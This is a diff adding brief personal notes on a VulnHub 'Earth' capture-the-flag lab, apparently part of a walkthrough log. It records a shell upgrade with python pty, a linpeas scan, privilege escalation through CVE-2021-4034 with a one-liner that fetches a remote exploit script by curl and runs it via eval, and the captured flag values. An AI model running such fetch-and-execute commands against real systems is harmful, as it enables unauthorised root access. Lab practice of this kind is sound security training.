@@ -242,4 +242,13 @@ Jangow Vuln Hub
 
 ==============================================================================================
 
+Earth
 
+https://medium.com/@lukegearty/vulnhub-earth-walkthrough-a803e2623bb2
+found user flag through CLI command "locate 'flag'"
+cat /var/earth_web/user_flag.txt "[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]"
+try to get root_user
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+loaded linpeas.sh found CVE-2021-4034 in reporte
+try to apply this exploit trough 'eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"'
+got root_user and root _flag [root_flag_b0da9554d29db2117b02aa8b66ec492e]
